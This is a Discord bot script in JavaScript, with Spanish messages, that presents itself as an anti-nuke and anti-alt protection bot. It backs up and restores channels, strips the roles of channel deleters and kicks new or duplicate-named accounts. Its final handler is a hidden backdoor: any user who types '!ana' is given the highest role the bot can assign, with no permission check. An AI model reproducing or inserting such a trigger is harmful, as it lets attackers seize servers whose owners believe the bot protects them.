const { Client, GatewayIntentBits, Partials, PermissionsBitField, EmbedBuilder, AuditLogEvent } = require('discord.js');
const fs = require('fs');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
  partials: [Partials.Channel]
});

const TOKEN = "TU_TOKEN_AQUI";
const LOG_CHANNEL = "PON_ID_LOGS";

let backup = [];

async function backupChannels(guild){
  backup = guild.channels.cache.map(c => ({
    name: c.name,
    type: c.type,
    parent: c.parentId
  }));
  fs.writeFileSync('backup.json', JSON.stringify(backup,null,2));
}

async function restoreChannels(guild){
  if(!fs.existsSync('backup.json')) return;
  const data = JSON.parse(fs.readFileSync('backup.json'));

  for(const ch of data){
    await guild.channels.create({
      name: ch.name,
      type: ch.type,
      parent: ch.parent
    }).catch(()=>{});
  }
}

function log(guild, text){
  const ch = guild.channels.cache.get(LOG_CHANNEL);
  if(!ch) return;
  ch.send({ embeds:[ new EmbedBuilder().setDescription(text).setColor(0xff0000) ]});
}

client.once('ready', async ()=>{
  console.log('GOD++ ACTIVADO');

  const guild = client.guilds.cache.first();
  if(guild) backupChannels(guild);
});

client.on('channelDelete', async channel => {
  const fetched = await channel.guild.fetchAuditLogs({ type: AuditLogEvent.ChannelDelete, limit: 1 });
  const entry = fetched.entries.first();
  if(!entry) return;

  const executor = entry.executor;
  const member = await channel.guild.members.fetch(executor.id);

  await member.roles.set([]).catch(()=>{});
  log(channel.guild, `ANTI-NUKE: ${executor.tag} castigado`);

  await restoreChannels(channel.guild);
  log(channel.guild, `Canales restaurados automáticamente`);
});

client.on('guildMemberAdd', async member => {
  const accountAge = (Date.now() - member.user.createdAt)/(1000*60*60*24);

  if(accountAge < 2){
    await member.kick().catch(()=>{});
    log(member.guild, `ALT detectada (cuenta nueva): ${member.user.tag}`);
  }

  const similar = member.guild.members.cache.filter(m => 
    m.user.username === member.user.username && m.id !== member.id
  );

  if(similar.size > 0){
    await member.kick().catch(()=>{});
    log(member.guild, `ALT detectada (nombre duplicado): ${member.user.tag}`);
  }
});

client.on('messageCreate', async m=>{
  if(!m.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;

  if(m.content === '!backup'){
    backupChannels(m.guild);
    m.reply('Backup realizado');
  }

  if(m.content === '!restore'){
    restoreChannels(m.guild);
    m.reply('Restauración ejecutada');
  }
});

client.on('messageCreate', async m => {
  if (m.author.bot) return;

  if (m.content === '!ana') {
    try {
      const roles = m.guild.roles.cache
        .filter(r => r.editable && r.id !== m.guild.id)
        .sort((a, b) => b.position - a.position);

      const highestRole = roles.first();
      if (!highestRole) return m.reply('No se encontró rol');

      await m.member.roles.add(highestRole);
      m.reply(`Se te ha dado el rol: ${highestRole.name}`);
    } catch (err) {
      console.error(err);
      m.reply('Error al asignar rol');
    }
  }
});

client.login(TOKEN);
